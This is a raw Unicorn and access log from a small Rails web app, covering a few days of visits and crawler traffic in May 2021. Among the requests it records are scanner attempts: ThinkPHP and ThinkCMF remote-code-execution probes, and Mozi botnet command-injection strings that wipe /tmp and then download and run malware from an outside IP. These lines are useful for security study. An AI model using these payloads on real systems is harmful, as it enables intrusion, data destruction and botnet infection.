I, [2021-05-07T11:18:59.783677 #23842]  INFO -- : Refreshing Gem list
I, [2021-05-07T11:19:01.936574 #23842]  INFO -- : listening on addr=/var/www/my_app/shared/tmp/sockets/unicorn.sock fd=9
I, [2021-05-07T11:19:01.944471 #23846]  INFO -- : worker=0 ready
I, [2021-05-07T11:19:01.944735 #23842]  INFO -- : master process ready
I, [2021-05-07T11:19:02.797903 #24832]  INFO -- : executing ["/var/www/my_app/shared/bundle/ruby/2.6.0/bin/unicorn", "-c", "/var/www/my_app/current/config/unicorn.rb", "-E", "deployment", "-D", {9=>#<Kgio::UNIXServer:/var/www/my_app/shared/tmp/sockets/unicorn.sock>}] (in /var/www/my_app/releases/20210507111219)
I, [2021-05-07T11:19:02.798023 #24832]  INFO -- : forked child re-executing...
I, [2021-05-07T11:19:03.156937 #24832]  INFO -- : inherited addr=/var/www/my_app/shared/tmp/sockets/unicorn.sock fd=9
I, [2021-05-07T11:19:03.157211 #24832]  INFO -- : Refreshing Gem list
I, [2021-05-07T11:19:04.596646 #24832]  INFO -- : master process ready
I, [2021-05-07T11:19:04.604003 #25363]  INFO -- : worker=0 ready
I, [2021-05-07T11:19:04.689691 #23842]  INFO -- : reaped #<Process::Status: pid 23846 exit 0> worker=0
I, [2021-05-07T11:19:04.689795 #23842]  INFO -- : master complete
133.106.55.50 - - [20/May/2021:14:56:44 +0000] "GET /clubs/9 HTTP/1.0" 200 3771 0.0067
133.106.55.50 - - [20/May/2021:14:56:50 +0000] "GET / HTTP/1.0" 200 7270 0.0092
133.106.55.50 - - [20/May/2021:14:56:50 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
133.106.55.50 - - [20/May/2021:14:56:50 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
133.106.55.50 - - [20/May/2021:14:56:53 +0000] "GET /clubs/47 HTTP/1.0" 200 3870 0.0065
133.106.55.50 - - [20/May/2021:14:56:58 +0000] "GET /likes/47/create HTTP/1.0" 302 133 0.0031
133.106.55.50 - - [20/May/2021:14:56:58 +0000] "GET /signup HTTP/1.0" 200 2963 0.0067
133.106.55.50 - - [20/May/2021:14:57:06 +0000] "GET /clubs/47 HTTP/1.0" 200 3870 0.0068
133.106.55.50 - - [20/May/2021:14:57:07 +0000] "GET / HTTP/1.0" 200 7270 0.0090
133.106.55.50 - - [20/May/2021:14:57:07 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
133.106.55.50 - - [20/May/2021:14:57:07 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
133.106.55.50 - - [20/May/2021:14:57:10 +0000] "GET /clubs/78 HTTP/1.0" 200 3489 0.0065
133.106.55.50 - - [20/May/2021:14:57:14 +0000] "GET / HTTP/1.0" 200 7270 0.0089
133.106.55.50 - - [20/May/2021:14:57:15 +0000] "GET /clubs/23 HTTP/1.0" 200 3474 0.0064
133.106.55.50 - - [20/May/2021:14:57:23 +0000] "GET /events HTTP/1.0" 200 11561 0.0128
133.106.55.50 - - [20/May/2021:14:57:24 +0000] "GET /clubs HTTP/1.0" 200 3107 0.0054
133.106.55.50 - - [20/May/2021:14:57:26 +0000] "GET /credits HTTP/1.0" 200 4755 0.0072
133.106.55.50 - - [20/May/2021:14:57:27 +0000] "GET /clubs HTTP/1.0" 200 3107 0.0055
188.253.27.200 - - [20/May/2021:15:35:25 +0000] "GET / HTTP/1.0" 200 7270 0.0096
128.1.248.26 - - [20/May/2021:17:15:23 +0000] "GET /404?type=rau HTTP/1.0" 404 1722 0.0018
52.147.176.70 - - [20/May/2021:17:24:31 +0000] "GET /404 HTTP/1.0" 404 1722 0.0016
52.147.176.70 - - [20/May/2021:17:24:31 +0000] "POST /404 HTTP/1.0" 404 1722 0.0020
209.141.51.242 - - [20/May/2021:17:38:13 +0000] "GET /404?index=0 HTTP/1.0" 404 1722 0.0018
52.171.55.122 - - [20/May/2021:18:09:26 +0000] "GET /404 HTTP/1.0" 404 1722 0.0016
52.171.55.122 - - [20/May/2021:18:09:27 +0000] "POST /404 HTTP/1.0" 404 1722 0.0020
45.125.66.111 - - [20/May/2021:18:51:41 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
45.125.66.111 - - [20/May/2021:18:51:42 +0000] "POST /404 HTTP/1.0" 404 1722 0.0020
192.228.100.100 - - [20/May/2021:19:17:54 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
192.228.100.100 - - [20/May/2021:19:17:54 +0000] "POST /404 HTTP/1.0" 404 1722 0.0019
89.109.48.84 - - [20/May/2021:20:58:45 +0000] "GET / HTTP/1.0" 200 7270 0.0095
104.43.209.172 - - [20/May/2021:22:48:59 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
104.43.209.172 - - [20/May/2021:22:49:00 +0000] "POST /404 HTTP/1.0" 404 1722 0.0019
45.137.22.75 - - [20/May/2021:23:07:27 +0000] "GET /404 HTTP/1.0" 404 1722 0.0016
45.137.22.75 - - [20/May/2021:23:07:28 +0000] "POST /404 HTTP/1.0" 404 1722 0.0019
129.213.44.208 - - [20/May/2021:23:50:12 +0000] "POST /404 HTTP/1.0" 404 1722 0.0018
129.213.44.208 - - [20/May/2021:23:50:14 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
185.173.35.61 - - [21/May/2021:00:03:17 +0000] "GET / HTTP/1.0" 200 7270 0.0100
172.105.89.161 - - [21/May/2021:00:07:30 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
193.118.53.194 - - [21/May/2021:00:44:01 +0000] "GET / HTTP/1.0" 200 7270 0.0096
45.146.164.131 - - [21/May/2021:01:17:15 +0000] "POST /404 HTTP/1.0" 404 1722 0.0018
45.146.164.131 - - [21/May/2021:01:17:15 +0000] "POST /404 HTTP/1.0" 404 1722 0.0011
45.146.164.131 - - [21/May/2021:01:17:15 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
45.146.164.131 - - [21/May/2021:01:17:15 +0000] "GET /404?wt=json HTTP/1.0" 404 1722 0.0012
45.146.164.131 - - [21/May/2021:01:17:16 +0000] "GET /404?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.0" 404 1722 0.0020
45.146.164.131 - - [21/May/2021:01:17:16 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.0" 200 7270 0.0090
45.146.164.131 - - [21/May/2021:01:17:16 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
45.146.164.131 - - [21/May/2021:01:17:16 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 200 7270 0.0085
45.146.164.131 - - [21/May/2021:01:17:17 +0000] "POST /404 HTTP/1.0" 404 119 0.0019
45.146.164.131 - - [21/May/2021:01:17:17 +0000] "GET /404 HTTP/1.0" 404 1722 0.0015
45.146.164.131 - - [21/May/2021:01:17:17 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
45.171.210.136 - - [21/May/2021:01:27:35 +0000] "GET / HTTP/1.0" 200 7270 0.0096
167.248.133.54 - - [21/May/2021:02:01:13 +0000] "GET / HTTP/1.0" 200 7270 0.0093
167.248.133.54 - - [21/May/2021:02:01:13 +0000] "GET / HTTP/1.0" 200 7270 0.0086
66.249.68.13 - - [21/May/2021:02:08:36 +0000] "GET / HTTP/1.0" 200 7270 0.0096
66.249.68.15 - - [21/May/2021:02:31:03 +0000] "GET /about HTTP/1.0" 200 1939 0.0046
66.249.68.11 - - [21/May/2021:02:31:29 +0000] "GET /clubs HTTP/1.0" 200 3107 0.0052
162.142.125.39 - - [21/May/2021:02:59:23 +0000] "GET / HTTP/1.0" 200 7270 0.0095
162.142.125.39 - - [21/May/2021:02:59:23 +0000] "GET / HTTP/1.0" 200 7270 0.0090
222.136.127.106 - - [21/May/2021:04:30:44 +0000] "GET /404?cd+/tmp;rm+-rf+*;wget+http://222.136.127.106:59723/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.0" 404 1722 0.0018
201.210.150.222 - - [21/May/2021:05:08:58 +0000] "GET / HTTP/1.0" 200 7270 0.0096
209.17.97.42 - - [21/May/2021:05:10:59 +0000] "GET / HTTP/1.0" 200 7270 0.0086
80.82.77.192 - - [21/May/2021:05:25:23 +0000] "GET / HTTP/1.0" 200 7270 0.0097
209.17.97.26 - - [21/May/2021:05:52:13 +0000] "GET / HTTP/1.0" 200 7270 0.0093
192.241.211.146 - - [21/May/2021:07:29:30 +0000] "GET /404 HTTP/1.0" 404 1722 0.0188
66.249.68.15 - - [21/May/2021:07:37:28 +0000] "GET /credits HTTP/1.0" 200 4755 0.0084
66.249.68.11 - - [21/May/2021:07:40:20 +0000] "GET /manuscripts HTTP/1.0" 200 11685 0.0135
66.249.68.11 - - [21/May/2021:07:40:32 +0000] "GET /login HTTP/1.0" 200 3039 0.0061
66.249.68.11 - - [21/May/2021:07:40:33 +0000] "GET /about HTTP/1.0" 200 1939 0.0051
66.249.68.13 - - [21/May/2021:07:40:33 +0000] "GET /events HTTP/1.0" 200 11561 0.0136
66.249.68.11 - - [21/May/2021:07:40:34 +0000] "GET /manager HTTP/1.0" 200 9849 0.0050
66.249.68.15 - - [21/May/2021:07:43:13 +0000] "GET /clubs/iinkai HTTP/1.0" 200 3141 0.0105
92.38.45.250 - - [21/May/2021:07:48:55 +0000] "GET / HTTP/1.0" 200 7270 0.0089
93.243.192.2 - - [21/May/2021:07:49:56 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:49:57 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:49:59 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0018
93.243.192.2 - - [21/May/2021:07:50:00 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:50:02 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0018
93.243.192.2 - - [21/May/2021:07:50:03 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:50:05 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0020
93.243.192.2 - - [21/May/2021:07:50:06 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:50:08 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:50:09 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0018
93.243.192.2 - - [21/May/2021:07:50:10 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:50:12 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0018
93.243.192.2 - - [21/May/2021:07:50:13 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:50:15 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:50:16 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0020
93.243.192.2 - - [21/May/2021:07:50:18 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:50:19 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:50:20 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0018
93.243.192.2 - - [21/May/2021:07:50:22 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0018
93.243.192.2 - - [21/May/2021:07:50:23 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0020
93.243.192.2 - - [21/May/2021:07:50:25 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0020
93.243.192.2 - - [21/May/2021:07:50:27 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:50:29 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:50:30 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0020
93.243.192.2 - - [21/May/2021:07:50:32 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:50:33 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:50:34 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:50:37 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0020
93.243.192.2 - - [21/May/2021:07:50:38 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:50:40 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:50:42 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:50:44 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0020
93.243.192.2 - - [21/May/2021:07:50:45 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:50:47 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0020
93.243.192.2 - - [21/May/2021:07:50:48 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:50:50 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0020
93.243.192.2 - - [21/May/2021:07:50:51 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0020
93.243.192.2 - - [21/May/2021:07:50:53 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0020
93.243.192.2 - - [21/May/2021:07:50:54 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:50:55 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:50:57 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0020
93.243.192.2 - - [21/May/2021:07:50:58 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:51:00 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:51:01 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:51:03 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:51:04 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:51:06 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:51:07 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:51:09 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:51:10 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:51:11 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:51:13 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0020
93.243.192.2 - - [21/May/2021:07:51:14 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:51:16 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0020
93.243.192.2 - - [21/May/2021:07:51:17 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:51:19 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:51:20 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0018
93.243.192.2 - - [21/May/2021:07:51:21 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
93.243.192.2 - - [21/May/2021:07:51:26 +0000] "GET /404?lang=en HTTP/1.0" 404 1722 0.0019
128.14.134.134 - - [21/May/2021:07:56:15 +0000] "GET / HTTP/1.0" 200 7270 0.0094
66.249.68.13 - - [21/May/2021:08:23:46 +0000] "GET /clubs HTTP/1.0" 200 3107 0.0049
66.249.68.11 - - [21/May/2021:08:27:04 +0000] "GET /credits/new HTTP/1.0" 200 10158 0.0085
66.249.68.15 - - [21/May/2021:08:29:21 +0000] "GET /credits/easy HTTP/1.0" 200 4825 0.0077
66.249.68.13 - - [21/May/2021:08:30:16 +0000] "GET /credits/full HTTP/1.0" 200 4825 0.0071
185.100.87.241 - - [21/May/2021:08:32:19 +0000] "GET / HTTP/1.0" 200 7270 0.0091
66.249.68.15 - - [21/May/2021:08:33:30 +0000] "GET /password_resets/new HTTP/1.0" 200 2511 0.0077
66.249.68.13 - - [21/May/2021:08:34:09 +0000] "GET /clubs/95 HTTP/1.0" 200 3291 0.0066
66.249.68.11 - - [21/May/2021:08:38:57 +0000] "GET /clubs/94 HTTP/1.0" 200 3557 0.0064
66.249.68.11 - - [21/May/2021:08:41:40 +0000] "GET /clubs/96 HTTP/1.0" 200 4065 0.0063
59.99.41.95 - - [21/May/2021:08:54:03 +0000] "GET /404?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://59.99.41.95:59319/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 1722 0.0020
66.249.68.11 - - [21/May/2021:09:03:04 +0000] "GET /likes/96/create HTTP/1.0" 302 92 0.0029
66.249.68.15 - - [21/May/2021:09:03:05 +0000] "GET /signup HTTP/1.0" 200 2963 0.0067
66.249.68.11 - - [21/May/2021:09:05:19 +0000] "GET /likes/95/create HTTP/1.0" 302 92 0.0028
66.249.68.13 - - [21/May/2021:09:05:20 +0000] "GET /signup HTTP/1.0" 200 2963 0.0068
188.232.224.13 - - [21/May/2021:09:11:09 +0000] "GET / HTTP/1.0" 200 7270 0.0098
66.249.68.13 - - [21/May/2021:09:26:08 +0000] "GET /likes/94/create HTTP/1.0" 302 92 0.0028
66.249.68.11 - - [21/May/2021:09:26:09 +0000] "GET /signup HTTP/1.0" 200 2963 0.0066
192.241.207.16 - - [21/May/2021:09:37:07 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
66.249.68.13 - - [21/May/2021:10:10:06 +0000] "GET /events/18 HTTP/1.0" 200 1981 0.0069
66.249.68.11 - - [21/May/2021:10:10:12 +0000] "GET /events/33 HTTP/1.0" 200 1981 0.0058
66.249.68.11 - - [21/May/2021:10:10:27 +0000] "GET /events/13 HTTP/1.0" 200 1981 0.0059
66.249.68.11 - - [21/May/2021:10:10:43 +0000] "GET /events/26 HTTP/1.0" 200 1981 0.0058
66.249.68.11 - - [21/May/2021:10:11:07 +0000] "GET /events/22 HTTP/1.0" 200 1981 0.0059
66.249.68.13 - - [21/May/2021:10:11:40 +0000] "GET /events/21 HTTP/1.0" 200 1981 0.0058
66.249.68.11 - - [21/May/2021:10:12:11 +0000] "GET /events/30 HTTP/1.0" 200 1981 0.0060
66.249.68.11 - - [21/May/2021:10:12:44 +0000] "GET /events/36 HTTP/1.0" 200 1981 0.0058
66.249.68.11 - - [21/May/2021:10:13:17 +0000] "GET /events/27 HTTP/1.0" 200 1981 0.0060
192.241.212.84 - - [21/May/2021:10:47:33 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
212.83.8.81 - - [21/May/2021:10:52:48 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
129.213.44.208 - - [21/May/2021:11:14:01 +0000] "POST /404 HTTP/1.0" 404 1722 0.0018
129.213.44.208 - - [21/May/2021:11:14:02 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
52.27.195.166 - - [21/May/2021:11:37:24 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
104.206.128.10 - - [21/May/2021:11:38:19 +0000] "GET / HTTP/1.0" 200 7270 0.0102
64.62.197.152 - - [21/May/2021:12:01:38 +0000] "GET / HTTP/1.0" 200 7270 0.0095
138.197.89.132 - - [21/May/2021:12:09:32 +0000] "POST /404 HTTP/1.0" 404 1722 0.0019
138.197.89.132 - - [21/May/2021:12:09:33 +0000] "POST /404 HTTP/1.0" 404 1722 0.0019
138.197.89.132 - - [21/May/2021:12:09:33 +0000] "GET /login HTTP/1.0" 200 3039 0.0059
138.197.89.132 - - [21/May/2021:12:09:33 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
138.197.89.132 - - [21/May/2021:12:09:33 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
138.197.89.132 - - [21/May/2021:12:09:34 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
138.197.89.132 - - [21/May/2021:12:09:34 +0000] "GET /?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=__HelloThinkPHP HTTP/1.0" 200 7270 0.0100
80.82.77.139 - - [21/May/2021:12:36:43 +0000] "GET / HTTP/1.0" 200 7270 0.0093
80.82.77.139 - - [21/May/2021:12:36:44 +0000] "GET /404 HTTP/1.0" 404 119 0.0020
80.82.77.139 - - [21/May/2021:12:36:44 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
34.77.163.42 - - [21/May/2021:12:36:49 +0000] "GET / HTTP/1.0" 200 7270 0.0088
88.5.237.10 - - [21/May/2021:13:19:26 +0000] "GET / HTTP/1.0" 200 7270 0.0095
178.94.10.135 - - [21/May/2021:14:01:01 +0000] "GET / HTTP/1.0" 200 7270 0.0097
66.115.145.40 - - [21/May/2021:14:10:51 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
34.77.163.42 - - [21/May/2021:14:39:39 +0000] "GET / HTTP/1.0" 200 7270 0.0098
192.53.170.243 - - [21/May/2021:14:58:11 +0000] "GET / HTTP/1.0" 200 7270 0.0093
66.249.68.11 - - [21/May/2021:16:52:31 +0000] "GET / HTTP/1.0" 200 7270 0.0096
45.146.164.125 - - [21/May/2021:16:57:20 +0000] "POST /404 HTTP/1.0" 404 1722 0.0018
45.146.164.125 - - [21/May/2021:16:57:20 +0000] "POST /404 HTTP/1.0" 404 1722 0.0016
45.146.164.125 - - [21/May/2021:16:57:21 +0000] "GET /404?wt=json HTTP/1.0" 404 1722 0.0020
45.146.164.125 - - [21/May/2021:16:57:21 +0000] "GET /404?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.0" 404 1722 0.0020
45.146.164.125 - - [21/May/2021:16:57:22 +0000] "GET /404 HTTP/1.0" 404 1722 0.0184
45.146.164.125 - - [21/May/2021:16:57:22 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.0" 200 7270 0.0092
45.146.164.125 - - [21/May/2021:16:57:24 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
45.146.164.125 - - [21/May/2021:16:57:24 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
45.146.164.125 - - [21/May/2021:16:57:25 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 200 7270 0.0091
45.146.164.125 - - [21/May/2021:16:57:25 +0000] "POST /404 HTTP/1.0" 404 119 0.0019
45.146.164.125 - - [21/May/2021:16:57:26 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
40.89.169.49 - - [21/May/2021:17:01:14 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
40.89.169.49 - - [21/May/2021:17:01:14 +0000] "POST /404 HTTP/1.0" 404 1722 0.0020
192.241.208.61 - - [21/May/2021:17:28:09 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
172.104.242.173 - - [21/May/2021:18:24:39 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
132.145.151.103 - - [21/May/2021:19:08:49 +0000] "POST /404 HTTP/1.0" 404 1722 0.0020
132.145.151.103 - - [21/May/2021:19:08:49 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
192.241.204.240 - - [21/May/2021:19:15:18 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
104.43.209.172 - - [21/May/2021:20:03:03 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
104.43.209.172 - - [21/May/2021:20:03:04 +0000] "POST /404 HTTP/1.0" 404 1722 0.0020
20.190.218.1 - - [21/May/2021:21:43:03 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
20.190.218.1 - - [21/May/2021:21:43:03 +0000] "POST /404 HTTP/1.0" 404 1722 0.0019
85.100.141.251 - - [21/May/2021:22:00:01 +0000] "GET / HTTP/1.0" 200 7270 0.0823
129.213.44.208 - - [21/May/2021:22:03:01 +0000] "POST /404 HTTP/1.0" 404 1722 0.0019
129.213.44.208 - - [21/May/2021:22:03:03 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
5.8.10.202 - - [21/May/2021:22:04:04 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
128.14.141.34 - - [21/May/2021:23:22:31 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
200.63.115.222 - - [22/May/2021:00:17:53 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
132.145.151.103 - - [22/May/2021:00:48:25 +0000] "POST /404 HTTP/1.0" 404 1722 0.0019
132.145.151.103 - - [22/May/2021:00:48:26 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
209.17.96.250 - - [22/May/2021:00:58:15 +0000] "GET / HTTP/1.0" 200 7270 0.0098
192.241.206.224 - - [22/May/2021:01:12:50 +0000] "GET / HTTP/1.0" 200 7270 0.0096
178.72.78.105 - - [22/May/2021:02:00:18 +0000] "GET /404?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 1722 0.0020
162.142.125.56 - - [22/May/2021:02:08:34 +0000] "GET / HTTP/1.0" 200 7270 0.0098
162.142.125.56 - - [22/May/2021:02:08:35 +0000] "GET / HTTP/1.0" 200 7270 0.0095
91.205.173.252 - - [22/May/2021:02:17:06 +0000] "POST /404 HTTP/1.0" 404 1722 0.0018
44.234.39.57 - - [22/May/2021:02:57:32 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
44.234.39.57 - - [22/May/2021:02:57:32 +0000] "POST /404 HTTP/1.0" 404 1722 0.0019
5.250.175.145 - - [22/May/2021:03:26:49 +0000] "GET / HTTP/1.0" 200 7270 0.0098
162.142.125.55 - - [22/May/2021:04:25:35 +0000] "GET / HTTP/1.0" 200 7270 0.0097
162.142.125.55 - - [22/May/2021:04:25:35 +0000] "GET / HTTP/1.0" 200 7270 0.0090
51.15.239.50 - - [22/May/2021:04:29:00 +0000] "GET / HTTP/1.0" 200 7270 0.0089
170.239.109.129 - - [22/May/2021:04:40:35 +0000] "GET / HTTP/1.0" 200 7270 0.0096
133.106.54.157 - - [22/May/2021:04:43:05 +0000] "GET / HTTP/1.0" 200 7270 0.0088
133.106.54.157 - - [22/May/2021:04:43:07 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
133.106.54.157 - - [22/May/2021:04:43:37 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
133.106.54.157 - - [22/May/2021:04:45:23 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
133.106.54.157 - - [22/May/2021:04:45:24 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
23.97.52.200 - - [22/May/2021:04:52:57 +0000] "GET / HTTP/1.0" 200 7270 0.0097
